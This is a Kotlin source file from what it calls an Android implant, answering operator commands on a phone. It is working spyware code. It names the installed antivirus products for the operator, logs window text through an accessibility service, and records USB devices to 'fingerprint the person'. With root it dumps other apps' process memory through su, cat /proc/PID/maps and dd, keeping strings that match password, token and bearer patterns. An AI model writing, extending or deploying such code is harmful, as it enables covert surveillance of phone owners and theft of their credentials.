package io.umbra.beacon

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.usb.UsbManager
import java.util.concurrent.TimeUnit

/**
 * The senses of the desktop, on a phone.
 *
 * The desktop implant has a window table, a clipboard, a screen in
 * motion, the saved wireless networks, the browsers, the security
 * software, the USB keys and the memory of a process.  The phone is not
 * a desktop, and most of those things do not exist there -- but the
 * operator asks with the same names, and the answer has to be the truth
 * of the phone, not a silence.
 *
 * So every family is answered here:
 *
 *   * `window.list`    -- the windows the accessibility service saw;
 *   * `clipboard.watch` -- the watcher of the clipboard (the same one
 *     that answers `clipboard.sniff`);
 *   * `screen.stream`  -- the pictures of the media projection;
 *   * `av.survey`      -- the security software that is installed;
 *   * `usb.history`    -- the USB devices, and the ones that were there;
 *   * `proc.memory`    -- the memory of a process, with root;
 *   * `wifi.profiles`  -- refused: the platform keeps the saved networks
 *     for the system alone;
 *   * `browser.creds`  -- refused: the databases of the browsers live in
 *     the storage of the browser.
 *
 * A refusal here names the reason, so the operator knows whether the
 * phone has nothing to give or whether the platform is hiding it.
 */
object Desktop {
    /** The packages of the security software that is worth naming. */
    private val SECURITY_PACKAGES = listOf(
        "com.mcafee",
        "com.symantec",
        "com.eset",
        "com.avast",
        "com.avg",
        "com.bitdefender",
        "com.kaspersky",
        "com.trendmicro",
        "com.malwarebytes",
        "com.sophos",
        "com.lookout",
        "com.drweb",
        "cn.opda",
        "com.cleanmaster",
        "com.qihoo",
        "com.baidu",
        "com.tencent",
    )

    /** The patterns of a string that carries a credential. */
    private val SECRET_PATTERNS = listOf(
        "password", "passwd", "secret", "token", "api_key", "apikey",
        "authorization:", "bearer ", "-----begin",
    )

    // -----------------------------------------------------------------------
    // The windows
    // -----------------------------------------------------------------------

    /**
     * The windows the phone showed.
     *
     * The phone has no window table: the accessibility service sees the
     * window that comes to the front and the text that came with it, and
     * the log of those changes is what the operator gets.  The service
     * has to be enabled; without it the log is empty and the answer says
     * so.
     */
    fun windows(): Sense.Report {
        val report = Sense.Report("window.list")
        val lines = Ui.log()
        if (lines.isEmpty()) {
            report.note(
                "the phone has no window table; the log of the windows is empty, " +
                    "and the accessibility service has to be enabled to fill it",
            )
            return report
        }
        for (line in lines) {
            val parts = line.split("|")
            report.row(
                "package" to parts.getOrNull(0)?.trim().orEmpty(),
                "class" to parts.getOrNull(1)?.trim().orEmpty(),
                "text" to parts.getOrNull(2)?.trim().orEmpty(),
            )
        }
        report.note("the phone has no window table: these are the windows the accessibility service saw")
        return report
    }

    // -----------------------------------------------------------------------
    // The security software
    // -----------------------------------------------------------------------

    /**
     * The security software of the phone.
     *
     * The list of the installed packages is public, so the products that
     * watch the phone can be named.  The answer also says what watches
     * the phone from the inside -- the accessibility service of the
     * implant is visible in the settings of the user, and the operator
     * has to know that.
     */
    fun avSurvey(context: Context): Sense.Report {
        val report = Sense.Report("av.survey")
        val installed = try {
            context.packageManager.getInstalledPackages(0)
        } catch (t: Throwable) {
            report.note("the list of the packages could not be read: ${t.message}")
            return report
        }
        report.note("the phone has ${installed.size} packages installed")
        val found = installed.filter { entry ->
            SECURITY_PACKAGES.any { entry.packageName.startsWith(it) }
        }
        for (entry in found) {
            report.row(
                "package" to entry.packageName,
                "product" to (entry.applicationInfo?.loadLabel(context.packageManager)?.toString()
                    ?: entry.packageName),
                "version" to "${entry.versionName}",
            )
        }
        if (found.isEmpty()) {
            report.note("no product of the security software of the list is installed")
        }
        report.note(
            "the accessibility service of the implant is " +
                if (Ui.isEnabled()) "running, and the user sees it in the settings" else "not running",
        )
        return report
    }

    // -----------------------------------------------------------------------
    // The USB keys
    // -----------------------------------------------------------------------

    /**
     * The USB devices of the phone.
     *
     * The devices that are attached are public, and the implant records
     * the ones that come and go in the queue of the watchers: the
     * platform itself keeps no history of the keys, so the history the
     * operator sees is the history the implant wrote.
     */
    fun usb(context: Context, stateDir: String): Sense.Report {
        val report = Sense.Report("usb.history")
        val manager = context.getSystemService(Context.USB_SERVICE) as? UsbManager
        if (manager == null) {
            report.note("the phone has no USB service")
        } else {
            val devices = manager.deviceList.values
            for (device in devices) {
                report.row(
                    "name" to device.deviceName,
                    "vendor" to "${device.vendorId}",
                    "product" to "${device.productId}",
                    "class" to "${device.deviceClass}",
                    "serial" to (device.serialNumber ?: ""),
                    "state" to "attached",
                )
            }
            report.note("${devices.size} devices are attached now")
        }
        val remembered = Watch.peek(stateDir).filter { it.kind == "usb" }
        for (item in remembered) {
            report.row(
                "name" to (item.fields["name"] ?: ""),
                "serial" to (item.fields["serial"] ?: ""),
                "state" to (item.fields["state"] ?: "seen"),
                "at" to "${item.at}",
            )
        }
        if (remembered.isEmpty()) {
            report.note("the phone keeps no history of the USB keys; the implant records the ones it sees")
        }
        return report
    }

    // -----------------------------------------------------------------------
    // The memory of a process
    // -----------------------------------------------------------------------

    /**
     * The memory of a process.
     *
     * The memory of another application belongs to that application, so
     * the answer needs root; without it the implant says so instead of
     * pretending the phone has nothing in its memory.  With root the
     * readable regions are read and the strings that carry something
     * that looks like a credential are reported.
     */
    fun memory(context: Context, pid: String): Sense.Report {
        val report = Sense.Report("proc.memory")
        val wanted = pid.trim()
        if (wanted.isEmpty()) {
            report.note("the dump needs args.pid: the process to read")
            return report
        }
        if (!AppDump.rooted()) {
            report.note(
                "the memory of the process $wanted is not readable without root; " +
                    "the storage of another application belongs to that application",
            )
            return report
        }
        val maps = shell("cat /proc/$wanted/maps 2>/dev/null")
        if (maps == null || maps.isBlank()) {
            report.note("the map of the process $wanted could not be read")
            return report
        }
        val regions = maps.lines().filter { it.isNotBlank() }
        report.note("the process $wanted has ${regions.size} regions")
        var read = 0
        var secrets = 0
        for (region in regions) {
            if (read >= 32) break
            val parts = region.split(" ")
            if (parts.size < 2 || !parts[1].startsWith("r")) continue
            val range = parts[0]
            val bounds = range.split("-")
            if (bounds.size != 2) continue
            val start = bounds[0].toLongOrNull() ?: continue
            val end = bounds[1].toLongOrNull() ?: continue
            val length = end - start
            if (length <= 0 || length > 65536) continue
            val bytes = shell(
                "dd if=/proc/$wanted/mem bs=4096 skip=${start / 4096} " +
                    "count=${(length / 4096).coerceAtLeast(1)} 2>/dev/null",
            )
            read++
            if (bytes == null) continue
            for (text in strings(bytes)) {
                if (looksSecret(text)) {
                    secrets++
                    report.row("pid" to wanted, "kind" to "secret", "text" to text.take(200))
                }
            }
        }
        report.note("$read regions were read, and $secrets strings look like a credential")
        return report
    }

    // -----------------------------------------------------------------------
    // The refusals
    // -----------------------------------------------------------------------

    /** The saved networks of the phone: the platform keeps them for itself. */
    fun wifiProfiles(context: Context): Sense.Report {
        val report = Sense.Report("wifi.profiles")
        report.note(
            "the saved networks of the phone are not readable: since the tenth version " +
                "the platform keeps them for the system alone, and the scan of the " +
                "networks around is the task wifi.dump",
        )
        return report
    }

    /** The credentials of the browsers: the storage of the browser is its own. */
    fun browserCreds(context: Context): Sense.Report {
        val report = Sense.Report("browser.creds")
        report.note(
            "the databases of the browsers live in the storage of the browser, and the " +
                "storage of another application is not readable without root",
        )
        return report
    }

    // -----------------------------------------------------------------------
    // The helpers
    // -----------------------------------------------------------------------

    /** The printable runs of a text: the strings of it. */
    private fun strings(text: String): List<String> {
        val out = mutableListOf<String>()
        val current = StringBuilder()
        for (char in text) {
            if (char.code in 32..126) {
                current.append(char)
                continue
            }
            if (current.length >= 6) out.add(current.toString())
            current.setLength(0)
        }
        if (current.length >= 6) out.add(current.toString())
        return out
    }

    /** Does the text look like a credential? */
    private fun looksSecret(text: String): Boolean {
        val lower = text.lowercase()
        return SECRET_PATTERNS.any { lower.contains(it) }
    }

    /** Run a command as the root of the phone. */
    private fun shell(command: String): String? {
        return try {
            val process = ProcessBuilder("su", "-c", command)
                .redirectErrorStream(true)
                .start()
            process.outputStream.close()
            val output = process.inputStream.bufferedReader().readText()
            if (!process.waitFor(AppDump.TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                process.destroyForcibly()
                return null
            }
            output
        } catch (_: Throwable) {
            null
        }
    }
}

/**
 * The watcher of the USB keys.
 *
 * The platform tells the applications that a device comes and goes, but
 * it keeps no history of it: the phone forgets the key of yesterday.  The
 * implant writes the events into the queue of the watchers, so the
 * operator sees the fingerprint of the person and not only the devices
 * of the moment.
 */
object UsbWatch {
    /** Whether the receiver is registered. */
    @Volatile private var registered = false

    /** The receiver itself, so it can be taken back. */
    private var receiver: BroadcastReceiver? = null

    /** Register the receiver of the USB events. */
    fun start(context: Context): String {
        if (registered) return "the watcher of the USB keys is already running"
        val filter = IntentFilter()
        filter.addAction("android.hardware.usb.action.USB_DEVICE_ATTACHED")
        filter.addAction("android.hardware.usb.action.USB_DEVICE_DETACHED")
        val created = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context, intent: Intent) {
                handle(ctx, intent)
            }
        }
        return try {
            // The broadcast of the platform comes from outside the
            // application, so the receiver is exported.
            context.registerReceiver(created, filter, Context.RECEIVER_EXPORTED)
            receiver = created
            registered = true
            "the watcher of the USB keys is running"
        } catch (t: Throwable) {
            "the watcher of the USB keys could not be registered: ${t.message ?: "the system refused"}"
        }
    }

    /** Take the receiver back. */
    fun stop(context: Context): String {
        val created = receiver
        receiver = null
        registered = false
        if (created == null) return "the watcher of the USB keys was not running"
        return try {
            context.unregisterReceiver(created)
            "the watcher of the USB keys was stopped"
        } catch (t: Throwable) {
            "the watcher of the USB keys could not be stopped: ${t.message ?: "the system refused"}"
        }
    }

    /** Whether the watcher runs. */
    fun running(): Boolean = registered

    /** What the phone says about the watcher. */
    fun status(context: Context): String {
        val out = StringBuilder()
        out.append("usb.history: the watcher is ")
            .append(if (registered) "running" else "stopped")
            .append('\n')
        out.append("usb.history: the queue holds ")
            .append(Watch.count(context.filesDir.absolutePath))
            .append(" items\n")
        return out.toString()
    }

    /** The device that came or went. */
    private fun handle(context: Context, intent: Intent) {
        try {
            val device = intent.getParcelableExtra<android.hardware.usb.UsbDevice>("device")
            val fields = LinkedHashMap<String, String>()
            fields["name"] = device?.deviceName ?: ""
            fields["vendor"] = "${device?.vendorId ?: 0}"
            fields["product"] = "${device?.productId ?: 0}"
            fields["serial"] = device?.serialNumber ?: ""
            fields["state"] = if (intent.action?.endsWith("DETACHED") == true) "detached" else "attached"
            Watch.append(context.filesDir.absolutePath, "usb", fields)
            Watch.wakeBeacon()
        } catch (_: Throwable) {
            // A device that cannot be read is not worth a crash.
        }
    }
}
